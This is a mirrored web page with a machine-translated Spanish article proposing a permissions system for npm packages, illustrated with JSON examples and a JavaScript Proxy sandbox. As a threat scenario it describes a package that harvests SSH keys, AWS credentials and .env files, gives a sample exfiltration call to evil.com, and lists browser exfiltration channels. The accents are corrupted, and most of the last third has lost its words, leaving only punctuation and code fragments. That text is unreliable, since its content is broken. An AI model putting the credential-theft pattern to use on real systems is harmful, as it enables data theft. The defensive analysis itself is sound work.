<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßî üò§ üëê Tener una idea: sistema de permisos para paquetes npm üê¥ ü§≥üèø üôãüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hace unos d√≠as, lanc√© la calculadora por primera vez en un tel√©fono nuevo y vi este mensaje: "La calculadora desea acceder a sus contactos". 


 Al pr...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Tener una idea: sistema de permisos para paquetes npm</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/433010/">  Hace unos d√≠as, lanc√© la calculadora por primera vez en un tel√©fono nuevo y vi este mensaje: "La calculadora desea acceder a sus contactos". <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bc6/ab2/2fb/bc6ab22fbd46e2703b3d248480a389cf.png"></div><br>  Al principio, este mensaje me pareci√≥ un poco triste (parec√≠a que la calculadora estaba sola), pero este caso me hizo pensar ... <br><a name="habracut"></a><br>  ¬øQu√© sucede si, como las aplicaciones telef√≥nicas, los paquetes npm tendr√≠an que declarar los permisos necesarios para su trabajo?  Con este enfoque, el archivo del paquete <code>package.json</code> podr√≠a verse as√≠: <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"fancy-logger"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"0.1.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: [<span class="hljs-string"><span class="hljs-string">"network"</span></span>],   <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: [<span class="hljs-string"><span class="hljs-string">"http"</span></span>, <span class="hljs-string"><span class="hljs-string">"fs"</span></span>] }, <span class="hljs-attr"><span class="hljs-attr">"etcetera"</span></span>: <span class="hljs-string"><span class="hljs-string">"etcetera"</span></span> }</code> </pre> <br>  En <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">npmjs.com, una</a> secci√≥n de la p√°gina del paquete con informaci√≥n sobre los permisos que necesita podr√≠a verse as√≠. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/9ab/9e6/76d/9ab9e676da3e313c47d59e564afd21bc.png"></div><br>  <i>Dicha secci√≥n de permisos podr√≠a estar disponible para paquetes en el sitio de registro npm.</i> <br>  Dichas listas de permisos para un paquete podr√≠an ser una combinaci√≥n de los permisos de todas sus dependencias con sus propios permisos. <br><br>  Una mirada al contenido de la secci√≥n de <code>permissions</code> del paquete <code>fancy-logger</code> podr√≠a hacer que el desarrollador piense por qu√© el paquete que escribe algo en la consola necesita acceso al m√≥dulo <code>http</code> y esto parece algo sospechoso. <br><br>  ¬øCu√°l ser√≠a el mundo en el que se usar√≠a un sistema de permisos similar para paquetes npm?  Quiz√°s alguien no vea el punto en esto, ya que se siente completamente seguro, por ejemplo, usando solo paquetes confiables de editores probados por el tiempo.  Para que todos los que lean esto se sientan vulnerables, aqu√≠ hay una historia corta. <br><br><h2>  <font color="#3AC1EF">La historia de c√≥mo robo tus variables de entorno</font> </h2><br>  Quer√≠a crear un paquete npm llamado <code>space-invaders</code> .  Fue interesante aprender c√≥mo hacer juegos escribiendo un juego que funciona en la consola y, al mismo tiempo, corroborar mi punto de vista sobre las vulnerabilidades relacionadas con los paquetes npm. <br><br>  Podr√≠as ejecutar este juego con este comando: <code>npx space-invaders</code> .  Despu√©s de su lanzamiento, uno podr√≠a comenzar a disparar inmediatamente a los alien√≠genas y matar el tiempo. <br><br>  Te gustar√≠a este juego, lo compartir√≠as con amigos, a ellos tambi√©n les gustar√≠a. <br><br>  Todo esto parece muy positivo, pero, entreteni√©ndote, los <code>space-invaders</code> del juego har√°n lo <code>space-invaders</code> , es decir, la recopilaci√≥n de algunos datos.  Recopilar√° informaci√≥n de <code>~/.ssh/</code> , <code>~/.aws/credentials</code> , de <code>~/.bash_profile</code> y otros lugares similares, lea el contenido de todos los archivos <code>.env</code> que pueda alcanzar, incluido <code>process.env</code> , mire a la configuraci√≥n de git (para averiguar de qui√©n es la informaci√≥n que recopila), y luego ella lo env√≠a todo a mi servidor. <br><br>  No he escrito un juego as√≠, pero desde hace un tiempo me siento inc√≥modo, y cuando ejecuto el comando <code>npm install</code> , pienso en lo vulnerable que es mi sistema.  Ahora, mirando el indicador de progreso de la instalaci√≥n, pienso en cu√°ntas carpetas y archivos est√°ndar en mi computadora port√°til cuyo contenido no debe caer en las manos equivocadas. <br><br>  Y no se trata solo de mi espacio de trabajo.  Por ejemplo, ni siquiera s√© si hay datos en algunas variables de entorno del sistema de ensamblaje de mi sitio para conectarme a la base de datos del servidor de producci√≥n.  Si en alg√∫n lugar hay tales datos, puede imaginar una situaci√≥n en la que un paquete npm malicioso instala un script en el sistema dise√±ado para conectarse a mi base de datos de trabajo.  Luego, este script ejecuta el comando <code>SELECT * from users</code> , luego <code>http.get('http://evil.com/that-data')</code> .  ¬øQuiz√°s fue precisamente debido a la posibilidad de tales ataques que me encontr√© con el consejo de que las contrase√±as no deber√≠an almacenarse en bases de datos en texto plano? <br><br>  Todo esto parece bastante aterrador, y lo m√°s probable es que ya est√© sucediendo (aunque es imposible decir exactamente si esto est√° sucediendo o no). <br><br>  Con esto, quiz√°s, dejaremos de hablar sobre las consecuencias del robo de datos importantes.  Volvamos al tema de los permisos para paquetes npm. <br><br><h2>  <font color="#3AC1EF">Cambios de permisos de bloqueo</font> </h2><br>  Supongo que ser√≠a genial poder ver los permisos que necesita el paquete al ver el sitio npm.  Pero debe tenerse en cuenta que la capacidad de ver los permisos es buena solo cuando se aplica a un punto espec√≠fico en el tiempo, de hecho, esto no resuelve el problema real. <br><br>  En un incidente reciente en npm, alguien primero public√≥ una versi√≥n de parche de un paquete con c√≥digo malicioso, y luego public√≥ una versi√≥n menor de la que ya se hab√≠a eliminado el c√≥digo malicioso.  El tiempo entre estos dos eventos fue suficiente para poner en peligro a muchos usuarios del paquete peligroso. <br><br>  Este es el problema  No paquetes creados por malware y que permanecen as√≠ todo el tiempo.  El problema es que, en un paquete aparentemente confiable, puede agregar silenciosamente algo malo y, despu√©s de un tiempo, eliminarlo. <br><br>  Como resultado, podemos decir que necesitamos un mecanismo para bloquear el conjunto de permisos recibidos por los paquetes. <br><br>  Quiz√°s sea algo as√≠ como un archivo <code>package-permissions.json</code> que establece permisos para Node.js y para el navegador y contiene una lista de paquetes que necesitan estos permisos.  Con este enfoque, ser√≠a necesario enumerar todos los paquetes en dicho archivo, y no solo los que est√°n en la secci√≥n de <code>dependencies</code> del archivo <code>package.json</code> del proyecto. <br><br>  As√≠ es como se ver√≠a el archivo <code>package-permissions.json</code> . <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"http"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"express"</span></span>,     <span class="hljs-string"><span class="hljs-string">"stream-http"</span></span>   ],   <span class="hljs-attr"><span class="hljs-attr">"fs"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"fs-extra"</span></span>,     <span class="hljs-string"><span class="hljs-string">"webpack"</span></span>,     <span class="hljs-string"><span class="hljs-string">"node-sass"</span></span>   ] }, <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"network"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"whatwg-fetch"</span></span>,     <span class="hljs-string"><span class="hljs-string">"new-relic"</span></span>   ] } }</code> </pre> <br>  Una versi√≥n real de dicho archivo podr√≠a contener muchas m√°s entradas de paquete. <br><br>  Ahora imagine que un d√≠a actualiza un paquete con doscientas dependencias que tambi√©n se actualizar√°n.  Se ha publicado una versi√≥n de parche para una de estas dependencias, que de repente necesit√≥ acceso a <code>http</code> Node.js. <br><br>  Si esto sucede, el comando <code>npm install</code> fallar√° con un mensaje similar al siguiente: ‚ÄúEl paquete <code>add-two-number</code> que necesitaba el paquete <code>fancy-logger</code> solicit√≥ acceso a <code>http</code> Node.js.  Ejecute el <code>npm update-permissions add-two-numbers</code> para resolver esto, luego ejecute el comando <code>npm install</code> nuevamente ". <br><br>  Aqu√≠, <code>fancy-logger</code> es el paquete que est√° en su archivo <code>package.json</code> (suponiendo que est√© familiarizado con este paquete), y el paquete <code>add-two-numbers</code> es una dependencia de <code>fancy-logger</code> la que nunca ha o√≠do hablar. <br><br>  Por supuesto, incluso si hay un archivo en el sistema para "bloquear" las dependencias, algunos desarrolladores confirmar√°n los nuevos permisos sin pensar en nada.  Pero, como m√≠nimo, un cambio en <code>package-permissions.json</code> ser√° visible en la solicitud de extracci√≥n, es decir, habr√° una posibilidad de que otro desarrollador m√°s responsable preste atenci√≥n a esto. <br><br>  Adem√°s, los cambios a los permisos solicitados requerir√≠an que el registro npm mismo notifique a los autores de paquetes cuando una situaci√≥n cambia en alg√∫n lugar del √°rbol de dependencia de sus paquetes.  Quiz√°s, esto se har√° por correo electr√≥nico con los siguientes contenidos: <br><br>  "Hola, autor de <code>fancy-logger</code> .  Le informamos que <code>add-two-number</code> , el paquete cuyas capacidades utiliza, solicit√≥ permiso para trabajar con el m√≥dulo <code>http</code> .  Los permisos de su paquete, como se muestra en <code>npmjs.com/package/fancy-logger</code> , se han actualizado en consecuencia ". <br><br>  Esto, por supuesto, se sumar√° al trabajo tanto de los autores de los paquetes como del propio npm, pero estas cosas ser√°n dignas de pasar un poco de tiempo en ellas.  En este caso, el autor de <code>add-two-numbers</code> puede estar absolutamente seguro de que si solicita permiso para trabajar con el m√≥dulo <code>http</code> , esto provocar√° la activaci√≥n de muchas "alarmas" en todo el mundo. <br><br>  Eso es lo que necesitamos.  ¬øEh?  Me gustar√≠a esperar que, como en el caso de las aplicaciones telef√≥nicas, e incluso en el caso de las extensiones para Chrome, los paquetes que requieren menos permisos sean m√°s populares entre los usuarios que aquellos que necesitan un nivel inexplicablemente alto de acceso a los sistemas.  Esto, a su vez, har√° que los autores de paquetes piensen muy bien al elegir los permisos necesarios para su desarrollo. <br><br>  Supongamos que npm decide introducir un sistema de permisos.  El primer d√≠a de lanzamiento de dicho sistema, se considerar√° que todos los paquetes requieren permisos completos (tal decisi√≥n se tomar√° m√°s adelante, en los casos en que falta la secci√≥n de <code>permissions</code> en <code>package.json</code> ). <br><br>  El autor del paquete, que quiere afirmar que su paquete no requiere permisos especiales, estar√° interesado en agregar la secci√≥n de <code>permissions</code> en <code>package.json</code> como un objeto vac√≠o.  Y, si los autores de los paquetes est√°n lo suficientemente interesados ‚Äã‚Äãcomo para que los permisos de dependencia no "sobrecarguen" sus paquetes, intentar√°n asegurarse de que estos paquetes de dependencia tampoco requieran permisos especiales, por ejemplo, haciendo solicitudes de extracci√≥n apropiadas en el repositorio de dependencias. <br><br>  Adem√°s, cada autor del paquete se esforzar√° por reducir el riesgo de vulnerabilidad de su paquete al romper una de sus dependencias.  Por lo tanto, si los autores de los paquetes usan dependencias que requieren permisos, que, al parecer, no son necesarios, tendr√°n un incentivo para cambiar a usar otros paquetes. <br><br>  Y en el caso de los desarrolladores que usan npm-packages cuando crean aplicaciones, esto los obligar√° a prestar especial atenci√≥n a los paquetes utilizados en sus proyectos, eligiendo principalmente aquellos que no requieren permisos especiales.  Al mismo tiempo, por supuesto, algunos paquetes, por razones objetivas, requerir√°n permisos que pueden causar problemas, pero es probable que dichos paquetes est√©n bajo un control especial de los desarrolladores. <br><br>  Quiz√°s algo como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Greenkeeper</a> pueda ayudar de alguna manera a resolver todos estos problemas. <br><br>  Finalmente, el archivo <code>package-permissions.json</code> proporcionar√° un resumen f√°cil de entender para un profesional de seguridad que eval√∫a posibles "agujeros" en la aplicaci√≥n y le permite hacer preguntas espec√≠ficas sobre paquetes controvertidos y sus permisos. <br><br>  Como resultado, espero que esta propiedad de <code>permissions</code> simple pueda extenderse ampliamente entre aproximadamente 800,000 paquetes npm y hacer que npm sea m√°s seguro. <br><br>  Por supuesto, esto no evitar√° posibles ataques.  As√≠ como los permisos solicitados por las aplicaciones m√≥viles no hacen imposible crear aplicaciones m√≥viles maliciosas distribuidas a trav√©s de sitios oficiales.  Pero esto reducir√° la "superficie de ataque" a paquetes que soliciten expl√≠citamente permiso para realizar ciertas acciones que podr√≠an representar una amenaza para los sistemas inform√°ticos.  Adem√°s, ser√° interesante saber qu√© porcentaje de paquetes no necesita ning√∫n permiso especial. <br><br>  As√≠ es como se ve el mecanismo para trabajar con permisos para paquetes npm que pens√©.  Si esta idea se hace realidad, podemos confiar en el hecho de que los atacantes describir√°n honestamente sus paquetes declarando permisos o combinando el sistema de declarar permisos con el mecanismo de restricci√≥n forzada de las capacidades de los paquetes de acuerdo con los permisos solicitados por ellos.  Esta es una pregunta interesante.  Echemos un vistazo como se aplica a Node.js y navegadores. <br><br><h2>  <font color="#3AC1EF">Forzar restricciones de paquetes de acuerdo con los permisos solicitados por ellos en Node.js</font> </h2><br>  Aqu√≠ veo dos opciones posibles para aplicar tales restricciones. <br><br><h3>  <font color="#3AC1EF">‚ñç Opci√≥n 1: paquete npm especial que impone medidas de seguridad</font> </h3><br>  Imagine un paquete creado y mantenido por npm (o alguna otra organizaci√≥n igualmente autoritaria y visionaria).  Deje que este paquete se llame <code>@npm/permissions</code> . <br><br>  Dicho paquete se incluir√≠a en el c√≥digo de la aplicaci√≥n con el primer comando de importaci√≥n, o las aplicaciones se iniciar√≠an con un comando del formulario <code>node -r @npm/permissions index.js</code> . <br><br>  Un paquete anular√≠a otros comandos de importaci√≥n para que no violaran los permisos establecidos en la secci√≥n de <code>permissions</code> de los archivos <code>package.json</code> de otros paquetes.  Si el autor de un determinado paquete <code>lovely-logger</code> no declar√≥ la necesidad de este paquete en el m√≥dulo <code>http</code> Node.js, esto significa que dicho m√≥dulo no puede acceder a dicho paquete. <br><br>  Estrictamente hablando, bloquear m√≥dulos completos de Node.js de esta manera no es ideal.  Por ejemplo, el paquete de <code>methods</code> npm carga el m√≥dulo <code>http</code> Node.js, pero no env√≠a ning√∫n dato al usarlo.  Simplemente toma el objeto <code>http.METHODS</code> , convierte su nombre a <code>http.METHODS</code> y lo exporta como un paquete npm cl√°sico.  Ahora, este paquete parece un gran objetivo para un atacante: tiene 6 millones de descargas por semana, mientras que no ha cambiado en 3 a√±os.  Podr√≠a escribir a los autores de este paquete e invitarlos a que me den su repositorio. <br><br>  Teniendo en cuenta el paquete de <code>methods</code> , ser√≠a mejor considerar que no requiere permiso de <code>network</code> , y no permiso que da acceso al m√≥dulo <code>http</code> .  Luego, esta restricci√≥n se puede solucionar utilizando un mecanismo externo y neutralizar cualquier intento de este paquete para enviar ciertos datos de los sistemas en los que funciona. <br><br>  El paquete imaginario <code>@npm/permissions</code> tambi√©n podr√≠a restringir el acceso de un paquete a cualquier otro paquete que no figurara como sus dependencias.  Esto evitar√° que el paquete, por ejemplo, importe algo como <code>fs-extra</code> y <code>request</code> , y use las capacidades de estos paquetes para leer datos del sistema de archivos y enviar datos le√≠dos a un atacante. <br><br>  Del mismo modo, puede ser √∫til distinguir entre acceso de disco "interno" y "externo".  Estoy bastante contento de que el <code>node-sass</code> necesite acceso a materiales ubicados dentro del directorio de mi proyecto, pero no veo ninguna raz√≥n por la cual este paquete necesita acceso a algo fuera de este directorio. <br><br>  Quiz√°s, al comienzo de la introducci√≥n del sistema de permisos, el <code>@npm/permissions</code> deber√° agregarse a los proyectos manualmente.  Quiz√°s, durante el per√≠odo de transici√≥n, durante la eliminaci√≥n de fallos de funcionamiento inevitables, este es el √∫nico enfoque razonable para utilizar dicho mecanismo.  Pero para garantizar una seguridad real, es necesario que este paquete est√© estrechamente integrado en el sistema, ya que ser√° necesario tener en cuenta los permisos al ejecutar los scripts de instalaci√≥n del paquete. <br><br>  Entonces, lo m√°s probable, resulta que un simple comando de la forma <code>"enforcePermissions": true</code> en el archivo <code>package.json</code> del proyecto le dir√° a npm que ejecute cualquier script con el uso forzado de los permisos declarados por ellos. <br><br><h3>  <font color="#3AC1EF">‚ñç Opci√≥n 2: Modo seguro Node.js</font> </h3><br>  El modo especial de operaci√≥n de Node.js, enfocado en un mayor nivel de seguridad, obviamente, requerir√° cambios m√°s serios.  Pero tal vez a la larga, la plataforma Node.js pueda imponer restricciones establecidas por los permisos declarados por cada paquete. <br><br>  Por un lado, s√© que aquellos que est√°n desarrollando la plataforma Node.js se esfuerzan por resolver los problemas de esta plataforma, y ‚Äã‚Äãmis ideas sobre la seguridad de los paquetes npm van m√°s all√° del alcance de sus intereses.  Despu√©s de todo, al final, npm es solo la tecnolog√≠a que acompa√±a a Node.js.  Por otro lado, los desarrolladores de Node.js est√°n interesados ‚Äã‚Äãen hacer que los usuarios corporativos se sientan seguros al trabajar con esta plataforma, y ‚Äã‚Äãla seguridad, presumiblemente, es uno de esos aspectos de Node.js que no se debe dar a la "comunidad". <br><br>  Entonces, si bien todo lo que hablamos parec√≠a bastante simple y se reduc√≠a al hecho de que el sistema de una forma u otra seguir√≠a las capacidades utilizadas por los m√≥dulos durante la operaci√≥n de Node.js. <br><br>  Ahora hablemos de los navegadores.  Todo aqu√≠ no parece tan claro y entendible en absoluto. <br><br><h2>  <font color="#3AC1EF">Restricci√≥n forzada de las capacidades de los paquetes de acuerdo con los permisos solicitados en los navegadores</font> </h2><br>  A primera vista, la restricci√≥n forzada de las capacidades de los paquetes en los navegadores parece a√∫n m√°s simple, ya que el c√≥digo que se ejecuta en el navegador no puede hacer mucho, especialmente con respecto al sistema operativo en el que se ejecuta el navegador.  De hecho, en el caso de los navegadores, solo debe preocuparse por la capacidad de los paquetes para transferir datos a direcciones inusuales. <br><br>  El problema aqu√≠ es que hay innumerables formas de enviar datos desde el navegador del usuario al servidor del atacante. <br><br>  Esto se llama exfiltraci√≥n o fuga de datos, y si le pregunta a un profesional de seguridad c√≥mo evitar esto, √©l, con la mirada de la persona que invent√≥ la p√≥lvora, le dir√° que deje de usar npm. <br><br>  Creo que para los paquetes que se ejecutan en los navegadores, debe prestar atenci√≥n a una sola resoluci√≥n: la que es responsable de la capacidad de trabajar con la red.  Llam√©moslo <code>network</code> .  Puede haber otros permisos en este entorno (como los que regulan el acceso al DOM o al almacenamiento local), pero aqu√≠ procedo suponiendo que nuestra principal preocupaci√≥n es la posibilidad de fuga de datos. <br><br>  Los datos del navegador se pueden "eliminar" de muchas maneras.  Estos son los que recuerdo en 60 segundos: <br><br><ul><li>  <code>fetch</code> API. </li><li>  Tomas web </li><li>  Tecnolog√≠a WebRTC. </li><li>  Constructor de <code>EventSource</code> . </li><li>  API <code>XMLHttpRequest</code> </li><li>  Establecer la propiedad <code>innerHTML</code> de varios elementos (puede crear nuevos elementos). </li><li>  Crear un objeto de imagen con el <code>new Image()</code> comando <code>new Image()</code> (la propiedad <code>src</code> de una imagen puede servir como medio para filtrar datos). </li><li>  Configurar <code>document.location</code> , <code>window.location</code> , etc. </li><li>  Cambiar las propiedades <code>src</code> de una imagen existente, <code>iframe</code> o algo as√≠. </li><li>  Cambios en la propiedad de <code>target</code> del elemento <code>&lt;form&gt;</code> . </li><li>  Usando una cadena inteligentemente dise√±ada para acceder a cualquiera de los mecanismos anteriores o para acceder a algo en la <code>top</code> o <code>self</code> lugar de <code>windows</code> . </li></ul><br>  Cabe se√±alar que una buena Pol√≠tica de seguridad de contenido (CSP) puede neutralizar algunas de estas amenazas, pero esto no se aplica a todas ellas.  Si alguien puede corregirme, estar√© feliz, pero creo que nunca puede confiar en el hecho de que CSP lo proteger√° completamente de la fuga de datos.  Una persona me dijo una vez que CSP proporciona protecci√≥n casi completa contra una gran cantidad de amenazas.  A esto respond√≠ que no puedes estar un poco embarazada, y desde entonces no nos hemos comunicado con esta persona. <br><br>  Si se acerca sabiamente a la b√∫squeda de formas de robar datos del navegador, estoy seguro de que es bastante realista hacer una lista bastante completa de estos m√©todos. <br><br>  Ahora necesitamos encontrar un mecanismo para prohibir el acceso al uso de oportunidades de dicha lista. <br><br>        Webpack (,    <code>@npm/permissions-webpack-plugin</code> ),     : <br><br><ul><li>         <code>browser</code>  <code>package-permissions.json</code>   ,  npm-      (  -  ,  ). </li><li>  ,   ,     ,        API,        . </li></ul><br> (,       Parcel, Rollup, Browserify     ). <br><br> , ,     -.    ,          ,        , , ,        . <br><br>   ,        ( Lodash, Moment,   ),       .        . <br><br>            . <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   (),   ,    function bigFrameworkWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //      const firstDiv = document.querySelector('div'); //    }, }; return module; } //   ( ),   ,    function smallUtilWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //  !     const firstDiv = document.querySelector('div'); //    }, }; return module; } const restrictedWindow = new Proxy(window, { get(target, prop, receiver) {   if (prop === 'document') {     return new Proxy(target.document, {       get(target, prop, receiver) {         if (prop === 'createElement') {           return new Proxy(window.document.createElement, {             apply(target, thisArg, argumentsList) {               if (['script', 'img', 'audio', 'and-so-on'].includes(argumentsList[0])) {                 console.error('A module without permissions attempted to create a naughty element');                 return false;               }               return target.apply(window.document, argumentsList);             },           });         }         const result = Reflect.get(target, prop, receiver);         if (typeof result === 'function') return result.bind(target);         return result;       },     });   }   return Reflect.get(target, prop, receiver); }, }); const bigFramework = bigFrameworkWrapper(window); bigFramework.doSomething(); //   const smallUtil = smallUtilWrapper(restrictedWindow); smallUtil.doSomething(); // ! "A module without permissions attempted to create a naughty element"</span></span></code> </pre> <br>  <code>function bigFrameworkWrapper(newWindow) {</code>  <code>function smallUtilWrapper(newWindow) {</code> ‚Äî  ,    .  ¬´¬ª      . <br><br>   <code>const newScript = document.createElement('script'); //  !</code>  ,         ‚Äî    <code>script</code> . <br><br>   <code>const bigFramework = bigFrameworkWrapper(window);</code>  <code>const smallUtil = smallUtilWrapper(restrictedWindow);</code>  ¬´¬ª     . ,      ,    . <br><br>   <code>const restrictedWindow = new Proxy(window, {</code>    <code>window</code> ,    ,     <code>window</code> ,   ,           <code>window.document.createElement</code>    DOM  . <br><br>     <code>Proxy</code> . <br><br>       .         ,           . <br><br> ,   ,       API,      .   ,     ,   ,  ,  ,     ,        ,    ,   ,     ,  ¬´¬ª   . <br><br>      ,   ,     ,   -     . <br><br> , ,  ,        ,       <code>Proxy</code> . ,      90% ,   .        ,         ,   . ,    -   ,             ,   ,  . <br><br>  ,   , ,       ,     ,              Node.js       . <br><br><h2> <font color="#3AC1EF"> </font> </h2><br>  ,   ,    HTTP   ,  , ,          -.  Esto es entendible. <br><br>     -,   ,  ,              .    <code>iframe</code> ,    .     <code>sandbox</code> ,    ,     .  ,    ,   ,     -. <br><br> ,   ,     <code>sandbox</code>  <code>&lt;script&gt;</code> .     : <code>&lt;script src="/some-package.js" sandbox="allow-exfiltration allow-whatevs"&gt;&lt;script&gt;</code> .      ,       ,      ,      - <code>create-react-app</code> ,   1.4   ,          . <br><br>     ,            npm  ,      . <br><br>  ,      -  . <br><br> ,  ,    -    ¬´ ...¬ª,     ,   ,       ? <br><br><h2>  <font color="#3AC1EF">Resumen</font> </h2><br>  ,   ,     , ,              .      ,  90% ,   ,    ,    10% ‚Äî ,    . <br><br> ,          ,           -  . <br><br>  <b>Estimados lectores!</b>   ,  ,       npm,   -? <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es433010/">https://habr.com/ru/post/es433010/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es432998/index.html">Cuento de navidad</a></li>
<li><a href="../es433000/index.html">Compilando Kotlin: JetBrains VS ANTLR VS JavaCC</a></li>
<li><a href="../es433002/index.html">Vamos t√∫ mismo ... o las reglas de comunicaci√≥n en un equipo</a></li>
<li><a href="../es433004/index.html">Una estrategia s√≥lida de migraci√≥n a la nube para 2019: 7 consejos</a></li>
<li><a href="../es433008/index.html">Los dispositivos USB son una amenaza "repentina"</a></li>
<li><a href="../es433012/index.html">Quiz√°s solo estoy vivo por ella: ¬øpor qu√© los pacientes con apnea conf√≠an en un programa escrito por un hacker?</a></li>
<li><a href="../es433014/index.html">Chistes sobre el reciente lanzamiento de astronautas al espacio exterior</a></li>
<li><a href="../es433016/index.html">Cambios en la interfaz, animaci√≥n en capas y caos visual estructurado: una revisi√≥n de las tendencias web para 2019</a></li>
<li><a href="../es433018/index.html">UDB Que es esto Parte 2. Ruta de datos</a></li>
<li><a href="../es433030/index.html">Live: rendimiento front-end</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>